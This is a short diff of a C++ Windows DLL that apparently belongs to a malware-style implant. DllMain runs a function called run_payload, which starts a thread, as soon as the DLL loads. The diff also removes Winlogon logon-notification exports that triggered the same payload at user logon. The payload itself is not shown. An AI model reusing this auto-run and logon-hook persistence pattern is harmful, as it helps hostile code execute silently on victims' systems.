@@ -39,23 +39,9 @@ void run_payload( ) {
     CreateThread( NULL, 0, exodus_thread, &g_exodus, 0, NULL );
 }
 
-extern "C" __declspec(dllexport) void WLEventLogon(LPVOID, LPVOID, LPVOID) {
-    run_payload();
-}
-
-extern "C" __declspec(dllexport) void WLEventLogoff(LPVOID, LPVOID, LPVOID) {}
-extern "C" __declspec(dllexport) void WLEventStartup(LPVOID, LPVOID, LPVOID) {}
-extern "C" __declspec(dllexport) void WLEventShutdown(LPVOID, LPVOID, LPVOID) {}
-extern "C" __declspec(dllexport) void WLEventLoggedOut(LPVOID, LPVOID, LPVOID) {}
-extern "C" __declspec(dllexport) void WLEventLoggedIn(LPVOID, LPVOID, LPVOID) {}
-
 BOOL WINAPI DllMain(HINSTANCE, DWORD fdwReason, LPVOID) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
         run_payload();
     }
     return TRUE;
-}
-
-int main( ) {
-    run_payload();
 }
